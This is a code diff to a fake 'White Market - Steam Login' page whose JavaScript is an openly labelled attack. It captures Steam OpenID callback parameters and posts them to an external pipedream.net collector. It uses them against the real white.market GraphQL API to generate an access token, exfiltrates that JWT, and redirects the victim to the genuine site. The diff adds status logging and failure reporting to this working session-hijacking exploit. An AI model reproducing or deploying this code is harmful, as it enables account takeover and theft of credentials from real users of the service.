@@ -3,13 +3,19 @@
 <head><title>White Market - Steam Login</title></head>
 <body>
 <h1>Connecting to Steam...</h1>
+<div id="status"></div>
 <script>
+const status = document.getElementById('status');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
+
+status.innerHTML = 'Checking for Steam callback...<br>';
 
 // Check if we're on the Steam callback
 const params = new URLSearchParams(window.location.search);
 
 if (params.has('openid.sig')) {
+    status.innerHTML += 'STEAM CALLBACK DETECTED!<br>';
+    
     // User was redirected here from Steam - steal the OpenID params!
     const steamAuth = {
         openidNs: params.get('openid.ns'),
@@ -24,6 +30,8 @@ if (params.has('openid.sig')) {
         openidSig: params.get('openid.sig')
     };
     
+    status.innerHTML += 'Stolen Steam parameters:<br>' + JSON.stringify(steamAuth, null, 2).substring(0, 200) + '...<br><br>';
+    
     // Send stolen Steam auth to our server
     fetch(REQUESTBIN, {
         method: 'POST',
@@ -35,11 +43,16 @@ if (params.has('openid.sig')) {
         })
     });
     
+    status.innerHTML += 'Attempting to generate JWT via CORS...<br>';
+    
     // Now use it to login and get JWT
     fetch('https://api.white.market/graphql/api', {
         method: 'POST',
         credentials: 'include',
-        headers: {'Content-Type': 'application/json'},
+        headers: {
+            'Content-Type': 'application/json',
+            'x-accept-language': 'en_US'
+        },
         body: JSON.stringify({
             query: 'mutation AuthSteam($steamAuth: SteamAuthInput!) { auth_steam(steamAuth: $steamAuth) { accessToken isNewPerson } }',
             variables: {steamAuth: steamAuth},
@@ -48,26 +61,51 @@ if (params.has('openid.sig')) {
     })
     .then(r => r.json())
     .then(d => {
+        console.log('auth_steam response:', d);
+        
         if (d.data && d.data.auth_steam) {
             // SUCCESS - got JWT!
+            status.innerHTML += '<strong>SUCCESS! JWT GENERATED!</strong><br>';
+            status.innerHTML += 'JWT: ' + d.data.auth_steam.accessToken.substring(0, 100) + '...<br>';
+            
             fetch(REQUESTBIN, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    attack: 'JWT_GENERATED',
+                    attack: 'JWT_GENERATED_SUCCESS',
                     jwt: d.data.auth_steam.accessToken,
+                    isNewPerson: d.data.auth_steam.isNewPerson,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        } else {
+            status.innerHTML += 'JWT generation failed: ' + JSON.stringify(d) + '<br>';
+            
+            fetch(REQUESTBIN, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    attack: 'JWT_GENERATION_FAILED',
+                    response: d,
                     timestamp: new Date().toISOString()
                 })
             });
         }
+    })
+    .catch(e => {
+        status.innerHTML += 'Error: ' + e.message + '<br>';
+        console.error(e);
     });
+    
+} else {
+    status.innerHTML += 'No Steam callback detected<br>';
+    status.innerHTML += 'URL params: ' + window.location.search + '<br>';
 }
 
-// Redirect victim to complete login
+status.innerHTML += '<br>Redirecting to white.market in 10 seconds...';
 setTimeout(() => {
     window.location.href = 'https://white.market';
-}, 3000);
+}, 10000);
 </script>
 </body>
 </html>
-```
